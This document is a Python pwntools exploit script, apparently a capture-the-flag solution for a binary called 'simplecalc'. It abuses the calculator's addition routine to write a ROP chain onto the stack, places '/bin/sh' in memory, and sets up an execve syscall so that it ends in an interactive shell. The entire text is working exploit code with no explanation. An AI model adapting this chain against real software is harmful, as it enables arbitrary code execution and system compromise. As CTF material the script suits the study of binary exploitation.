from pwn import *

elf = context.binary = ELF('./simplecalc',checksec=False)
io = process()

pop_rax = 0x44db34
pop_rdi = 0x401b73
pop_rsi = 0x401c87
pop_rdx = 0x437a85

mov_gadget = 0x44526e
syscall = 0x400488
binsh_addr = 0x6c1000
binsh_str = 0x0068732f6e69622f

io.recvuntil(b'calculations: ')
io.sendline(b'100')

def add_single(x):
    io.recvuntil(b'=> ')
    io.sendline(b'1')
    io.recvuntil(b'Integer x: ')
    io.sendline(b'100')
    io.recvuntil(b'Integer y: ')
    io.sendline(str(x - 100).encode())

def add(z):
    x = z & 0xffffffff
    y = (z >> 32) & 0xffffffff
    add_single(x)
    add_single(y)

for i in range(9):
    add(0x0)
    
add(pop_rax)
add(binsh_addr)

add(pop_rdx)
add(binsh_str)

add(mov_gadget)

add(pop_rax)
add(0x3b)
add(pop_rdi)
add(binsh_addr)
add(pop_rsi)
add(0x0)
add(pop_rdx)
add(0x0)

add(syscall)

io.sendline(b'5')

io.interactive()



